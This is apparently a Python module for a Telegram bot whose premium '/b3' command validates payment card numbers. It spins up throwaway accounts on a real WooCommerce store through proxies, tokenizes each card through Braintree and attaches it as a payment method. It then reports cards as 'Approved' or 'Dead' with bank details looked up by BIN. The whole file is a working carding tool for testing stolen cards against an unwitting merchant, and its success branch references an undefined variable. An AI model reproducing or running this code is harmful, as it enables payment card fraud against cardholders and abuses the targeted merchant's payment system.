import requests as r 
import string, random, re, time, argparse, base64
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode


@Client.on_message(filters.command(["braintree", "b3"], ["/", ",", ".", ";", "-"]))
async def jaico(client: Client, m: Message):
    card = m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    msg = await m.reply("checking...", quote=True)
    cc_check = await get_live(card, msg)    


BIN_API = "https://bins.antipublic.cc/bins/"


def load_proxies(filename):
    with open(filename, 'r') as file:
        proxies = [{'http': line.strip()} for line in file if line.strip()]
    return proxies

def getIndex(response):
    with open("index.html", "w", encoding="utf-8") as f:
        f.write(response.text)
        
def getStr(text:str, a:str, b:str) -> str:
    return text.split(a)[1].split(b)[0]

def email_generator():
    dominio = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'example.com']
    longitud = random.randint(8, 12) 
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    correo = usuario + '@' + random.choice(dominio)
    return correo

def open_files(file):
    with open(file, 'r') as f: return [line.strip() for line in f]

async def get_live(card, msg):
    card = card.replace(":", "|").replace("/", "|").replace(" ", "|")
    card_details = card.split("|")
    ccn = card_details[0]
    month = card_details[1]
    year = card_details[2]
    cvv = card_details[3]  

    if card[0] == '4':
        card_type = "Visa"
    elif card[0] == '5':
        card_type = 'master-card'
    elif card[0] == '3':
        card_type = "Amex"

    session = r.Session()
    proxies = load_proxies("src/extras/proxies.txt")
    proxy = random.choice(proxies)

# ============== First req: Getting nonce =================

    session = r.Session()
    user = longitud = random.randint(8, 12) 
    user = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    email = email_generator()

    initial_time = time.perf_counter()

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
}

    response = session.get('https://www.abnclean.ca/my-account/', headers=headers, proxies=proxy)
    wo_nonce = getStr(response.text, 'name="woocommerce-register-nonce" value="', '" />')
    current_time = datetime.now().strftime("%D - %H:%M:%S")
    msgg = f"""<b>{current_time}</b>
━━━━━━━━━━━
<b>CC:</b> {card}
<b>Status:</b> Checking...
"""
    await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


# ================== Second req: Creating the account ===============
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.abnclean.ca',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://www.abnclean.ca/my-account/',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
}

    data = {
        'email': email,
        'password': 'Holkgold211',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://www.abnclean.ca/',
        'wc_order_attribution_session_pages': '3',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'woocommerce-register-nonce': wo_nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
}

    response = session.post('https://www.abnclean.ca/my-account/', headers=headers, data=data, proxies=proxy)


# ========== Third req: Adding address ==========
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://www.abnclean.ca/my-account/',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
}

    response = session.get('https://www.abnclean.ca/my-account/edit-address/', headers=headers, proxies=proxy)

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://www.abnclean.ca/my-account/edit-address/',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
}

    response = session.get('https://www.abnclean.ca/my-account/edit-address/billing/',headers=headers, proxies=proxy)
    address_nonce = getStr(response.text, 'edit-address-nonce" value="', '" />')

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.abnclean.ca',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://www.abnclean.ca/my-account/edit-address/billing/',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
}

    data = {
        'billing_first_name': 'Leonel',
        'billing_last_name': 'M.',
        'billing_company': 'Hunting',
        'billing_country': 'CA',
        'billing_address_1': '8993 Av park',
        'billing_city': 'New york',
        'billing_state': 'AB',
        'billing_postcode': 'T0L 0X0',
        'billing_phone': '389403434',
        'billing_email': email,
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': address_nonce,
        '_wp_http_referer': '/my-account/edit-address/billing/',
        'action': 'edit_address',
}

    response = session.post('https://www.abnclean.ca/my-account/edit-address/billing/', headers=headers, data=data, proxies=proxy)

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.abnclean.ca/my-account/edit-address/billing/',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
}

    response = session.get('https://www.abnclean.ca/my-account/edit-address/', headers=headers, proxies=proxy)


# =========== Fourth req: Adding the payment method ==============0
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://www.abnclean.ca/my-account/edit-address/',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
}

    response = session.get('https://www.abnclean.ca/my-account/payment-methods/', headers=headers, proxies=proxy)

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://www.abnclean.ca/my-account/payment-methods/',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
}

    response = session.get('https://www.abnclean.ca/my-account/add-payment-method/', headers=headers, proxies=proxy)
    payment_nonce = getStr(response.text, 'payment-method-nonce" value="', '" />')
    client_nonce = getStr(response.text, '"client_token_nonce":"', '",')


    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://www.abnclean.ca',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://www.abnclean.ca/my-account/add-payment-method/',
}

    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client_nonce,
}

    response = session.post('https://www.abnclean.ca/wp-admin/admin-ajax.php', headers=headers, data=data, proxies=proxy)
    base64_code = getStr(response.text, '"data":"', '"}')
    base64_token_decrypted = str(base64.b64decode(base64_code))
    beareer = getStr(base64_token_decrypted, '"authorizationFingerprint":"', '","')
    bearer = "Bearer "+beareer


    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/json',
        'Authorization': bearer,
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://assets.braintreegateway.com',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://assets.braintreegateway.com/',
}

    json_data = {
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': ccn,
                    'expirationMonth': month,
                    'expirationYear': year,
                    'cvv': cvv,
            },
                'options': {
                    'validate': False,
            },
        },
    },
        'operationName': 'TokenizeCreditCard',
}

    response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxy)
    tokencc = getStr(response.text, '"token":"', '","')


    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.abnclean.ca',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://www.abnclean.ca/my-account/add-payment-method/',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
}

    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': card_type,
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': tokencc,
        'wc_braintree_device_data': '',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': payment_nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
}

    response = session.post('https://www.abnclean.ca/my-account/add-payment-method/', headers=headers, data=data, proxies=proxy)
    BIN = card[0:6]
    data = r.get(BIN_API+BIN).json()
    final_time = time.perf_counter() - initial_time

    if "Nice! New payment method added:" in response.text:
        mssg = f"""<b>#Braintree_Auth ($b3) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: Approved ✅<b> 
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {card_response}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: Woocommerce - Auth payment</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}""" # to check proxy add <a href="https://t.me/ByDog3r">⊁</a> <b>Proxy</b> :{proxy['http']} ✅
        await msg.edit_text(mssg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    else:
        card_response = getStr(response.text, """<ul class="woocommerce-error" role="alert">
			<li>""", '</li>')
        mssg = f"""<b>#Braintree_Auth ($b3) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: Dead ❌<b> 
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {card_response}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: Woocommerce - Auth payment</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}""" # to check proxy add <a href="https://t.me/ByDog3r">⊁</a> <b>Proxy</b> :{proxy['http']} ✅
        await msg.edit_text(mssg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    session.cookies.clear()
    session.close()